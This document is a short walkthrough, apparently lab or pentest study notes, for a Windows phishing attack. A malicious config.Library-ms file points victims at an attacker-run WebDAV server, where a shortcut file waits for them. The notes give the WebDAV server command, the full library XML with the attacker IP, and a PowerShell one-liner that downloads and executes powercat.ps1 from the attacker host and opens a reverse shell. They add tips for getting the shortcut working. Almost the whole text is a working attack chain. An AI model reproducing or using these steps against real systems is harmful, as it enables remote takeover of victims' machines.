Sypnosis:
When victim clicks the `config.Library-ms` file, it will trigger the download of `automatic_configuration.lnk` which will then activate `powercat.ps1` and making a connection back to ATTACKER!

Setup the server
```
wsgidav --host=<HOST_IP> --port=<PORT> --auth=<AUTH_TYPE> --root=<DOCUMENT_ROOT>
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
```


Create `config.Library-ms` on Vsc
```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.45.224</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Save and click the file. Observe connection to the `Webdav` server and downloaded `test.txt` located on the server
```
      <simpleLocation>
        <url>\\192.168.45.224\DavWWWRoot</url>
        <serialized>MBAAAEAFCAAAAAAAADAAAAAAAYkgCAQDQAAAAAgVwmD0dtdAAYFs5AdXbHAAWBbOQ312BAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAA0EAAAAHAAAACAAAAAAAAAAAAAAAcAAAAwEAAAAMAAAACAAAAQBAAAAAAAAAAAgLAwFXxkjMuEjN44CN14iMyQDXEFkVXd1VS90TUBAA+DAAAwAAAAKFA8BWNoBLwHivQNEiwO3Z8b5788LAAAQuAs7rTuzqAQAAAAAAA0CAAAQMTB1UzNU5K47Qt+UhknG3GODmuFBAAAwCAAAAAsAAAAw//DAAAAAAA0EAAAQMTB1UwEfJ3++RaARpxLAYM656sGDAAAgCAAAAA8BAAAwDAAAAxAQOAIDAuAQMAYDA4AgLAQDA1AgLAIDAyAANAAAAAAAAAAAAtAAAAEzUQNlOk2r3zezgDF55Ehp2pU5qRAAAAMAAAAAATAAAAAAAAAAAAAAAAAAAAAAAhAwwAACXcFTOy4SM2gjL0UjLyIDNcRUY2d1VXJ1bvRHAAAAFDAAABAAAgyFXxkjMuEjN44CN14iMyQDXEFmdXd1VS92b0BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcBAXAEDA5AgMA4CAxAgNAgDAuAANAUDAuAgMAIDA0AAXAQEAhBgdAcFAXBwVAIFAvBwbAQHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</serialized>
      </simpleLocation>
```
Revert the settings back to avoid running into issues
```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.45.224</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Create a LNK file embedding the following code
```
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.224:8000/powercat.ps1');
powercat -c 192.168.45.224 -p 443 -e powershell"
```
Note: 
- Type in the rest of the command as the space allowed for copy pasting is limited
- Check if LNK file works (Double click)
- Ensure `powercat`, LNK file are present in the webdav server root directory
